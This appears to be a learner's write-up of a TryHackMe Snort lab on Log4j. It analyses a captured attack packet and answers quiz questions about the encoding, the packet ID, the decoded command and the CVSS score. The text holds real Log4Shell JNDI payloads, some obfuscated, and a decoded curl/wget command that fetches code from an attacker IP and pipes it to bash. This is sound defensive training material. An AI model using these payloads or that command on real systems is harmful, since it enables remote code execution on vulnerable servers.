Investigate the log/alarm files.

What is the name of the used encoding algorithm?

```
root@ip-10-10-135-44:/home/ubuntu/Desktop/Exercise-Files/TASK-8 (Log4j)# sudo snort -c local-1.rules -r log4j.pcap -A console -dev -l .

WARNING: No preprocessors configured for policy 0.
12/12-05:06:07.579734  [**] [1:1000001:0] Packet size 770 and 855 [**] [Priority: 0] {TCP} 45.155.205.233:39692 -> 198.71.247.91:80
12/12-05:06:07.579734 64:9E:F3:BE:DB:66 -> 00:16:3C:F1:FD:6D type:0x800 len:0x349
45.155.205.233:39692 -> 198.71.247.91:80 TCP TTL:53 TOS:0x0 ID:62808 IpLen:20 DgmLen:827
***AP*** Seq: 0xDC9A621B  Ack: 0x9B92AFC8  Win: 0x1F6  TcpLen: 32
TCP Options (3) => NOP NOP TS: 1584792788 1670627000 
47 45 54 20 2F 3F 78 3D 24 7B 6A 6E 64 69 3A 6C  GET /?x=${jndi:l
64 61 70 3A 2F 2F 34 35 2E 31 35 35 2E 32 30 35  dap://45.155.205
2E 32 33 33 3A 31 32 33 34 34 2F 42 61 73 69 63  .233:12344/Basic
2F 43 6F 6D 6D 61 6E 64 2F 42 61 73 65 36 34 2F  /Command/Base64/
4B 47 4E 31 63 6D 77 67 4C 58 4D 67 4E 44 55 75  KGN1cmwgLXMgNDUu
4D 54 55 31 4C 6A 49 77 4E 53 34 79 4D 7A 4D 36  MTU1LjIwNS4yMzM6
4E 54 67 33 4E 43 38 78 4E 6A 49 75 4D 43 34 79  NTg3NC8xNjIuMC4y
4D 6A 67 75 4D 6A 55 7A 4F 6A 67 77 66 48 78 33  MjguMjUzOjgwfHx3
5A 32 56 30 49 43 31 78 49 43 31 50 4C 53 41 30  Z2V0IC1xIC1PLSA0
4E 53 34 78 4E 54 55 75 4D 6A 41 31 4C 6A 49 7A  NS4xNTUuMjA1LjIz
4D 7A 6F 31 4F 44 63 30 4C 7A 45 32 4D 69 34 77  Mzo1ODc0LzE2Mi4w
4C 6A 49 79 4F 43 34 79 4E 54 4D 36 4F 44 41 70  LjIyOC4yNTM6ODAp
66 47 4A 68 63 32 67 3D 7D 20 48 54 54 50 2F 31  fGJhc2g=} HTTP/1
2E 31 0D 0A 48 6F 73 74 3A 20 31 39 38 2E 37 31  .1..Host: 198.71
2E 32 34 37 2E 39 31 3A 38 30 0D 0A 55 73 65 72  .247.91:80..User
2D 41 67 65 6E 74 3A 20 24 7B 24 7B 3A 3A 2D 6A  -Agent: ${${::-j
7D 24 7B 3A 3A 2D 6E 7D 24 7B 3A 3A 2D 64 7D 24  }${::-n}${::-d}$
7B 3A 3A 2D 69 7D 3A 24 7B 3A 3A 2D 6C 7D 24 7B  {::-i}:${::-l}${
3A 3A 2D 64 7D 24 7B 3A 3A 2D 61 7D 24 7B 3A 3A  ::-d}${::-a}${::
2D 70 7D 3A 2F 2F 34 35 2E 31 35 35 2E 32 30 35  -p}://45.155.205
2E 32 33 33 3A 31 32 33 34 34 2F 42 61 73 69 63  .233:12344/Basic
2F 43 6F 6D 6D 61 6E 64 2F 42 61 73 65 36 34 2F  /Command/Base64/
4B 47 4E 31 63 6D 77 67 4C 58 4D 67 4E 44 55 75  KGN1cmwgLXMgNDUu
4D 54 55 31 4C 6A 49 77 4E 53 34 79 4D 7A 4D 36  MTU1LjIwNS4yMzM6
4E 54 67 33 4E 43 38 78 4E 6A 49 75 4D 43 34 79  NTg3NC8xNjIuMC4y
4D 6A 67 75 4D 6A 55 7A 4F 6A 67 77 66 48 78 33  MjguMjUzOjgwfHx3
5A 32 56 30 49 43 31 78 49 43 31 50 4C 53 41 30  Z2V0IC1xIC1PLSA0
4E 53 34 78 4E 54 55 75 4D 6A 41 31 4C 6A 49 7A  NS4xNTUuMjA1LjIz
4D 7A 6F 31 4F 44 63 30 4C 7A 45 32 4D 69 34 77  Mzo1ODc0LzE2Mi4w
4C 6A 49 79 4F 43 34 79 4E 54 4D 36 4F 44 41 70  LjIyOC4yNTM6ODAp
66 47 4A 68 63 32 67 3D 7D 0D 0A 52 65 66 65 72  fGJhc2g=}..Refer
65 72 3A 20 24 7B 6A 6E 64 69 3A 24 7B 6C 6F 77  er: ${jndi:${low
65 72 3A 6C 7D 24 7B 6C 6F 77 65 72 3A 64 7D 24  er:l}${lower:d}$
7B 6C 6F 77 65 72 3A 61 7D 24 7B 6C 6F 77 65 72  {lower:a}${lower
3A 70 7D 3A 2F 2F 34 35 2E 31 35 35 2E 32 30 35  :p}://45.155.205
2E 32 33 33 3A 31 32 33 34 34 2F 42 61 73 69 63  .233:12344/Basic
2F 43 6F 6D 6D 61 6E 64 2F 42 61 73 65 36 34 2F  /Command/Base64/
4B 47 4E 31 63 6D 77 67 4C 58 4D 67 4E 44 55 75  KGN1cmwgLXMgNDUu
4D 54 55 31 4C 6A 49 77 4E 53 34 79 4D 7A 4D 36  MTU1LjIwNS4yMzM6
4E 54 67 33 4E 43 38 78 4E 6A 49 75 4D 43 34 79  NTg3NC8xNjIuMC4y
4D 6A 67 75 4D 6A 55 7A 4F 6A 67 77 66 48 78 33  MjguMjUzOjgwfHx3
5A 32 56 30 49 43 31 78 49 43 31 50 4C 53 41 30  Z2V0IC1xIC1PLSA0
4E 53 34 78 4E 54 55 75 4D 6A 41 31 4C 6A 49 7A  NS4xNTUuMjA1LjIz
4D 7A 6F 31 4F 44 63 30 4C 7A 45 32 4D 69 34 77  Mzo1ODc0LzE2Mi4w
4C 6A 49 79 4F 43 34 79 4E 54 4D 36 4F 44 41 70  LjIyOC4yNTM6ODAp
66 47 4A 68 63 32 67 3D 7D 0D 0A 41 63 63 65 70  fGJhc2g=}..Accep
74 2D 45 6E 63 6F 64 69 6E 67 3A 20 67 7A 69 70  t-Encoding: gzip
0D 0A 43 6F 6E 6E 65 63 74 69 6F 6E 3A 20 63 6C  ..Connection: cl
6F 73 65 0D 0A 0D 0A                             ose....

find jndi cz log4j


```

*Base64*


Investigate the log/alarm files.

What is the IP ID of the corresponding packet?
*62808*



Investigate the log/alarm files.

Decode the encoded command.

What is the attacker's command?
You can use the "base64" tool. Read the log/alarm files and extract the bas64 command. base64 --decode filename.txt

```
KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3  Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=

using cyberchef

(curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash
```

*(curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash*


What is the CVSS v2 score of the Log4j vulnerability?

https://www.cvedetails.com/cve/CVE-2021-44228/

```
## CVSS Scores & Vulnerability Types

CVSS Score

9.3

Confidentiality Impact

Complete (There is total information disclosure, resulting in all system files being revealed.)

Integrity Impact

Complete (There is a total compromise of system integrity. There is a complete loss of system protection, resulting in the entire system being compromised.)

Availability Impact

Complete (There is a total shutdown of the affected resource. The attacker can render the resource completely unavailable.)

Access Complexity

Medium (The access conditions are somewhat specialized. Some preconditions must be satistified to exploit)

Authentication

Not required (Authentication is not required to exploit the vulnerability.)

Gained Access

None

Vulnerability Type(s)

Execute Code

CWE ID

[917](https://www.cvedetails.com/cwe-details/917/cwe.html "CWE-917 - CWE definition")

```

*9.3*

### Conclusion 


Congratulations! Are you brave enough to stop a live attack in the Snort2 Challenge 2 room?
https://tryhackme.com/room/snortchallenges2


[[Snort]]